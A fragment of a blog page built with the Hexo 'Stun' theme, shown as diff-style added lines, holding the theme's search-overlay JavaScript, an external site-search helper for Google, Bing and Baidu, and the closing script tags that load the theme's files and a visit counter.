+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
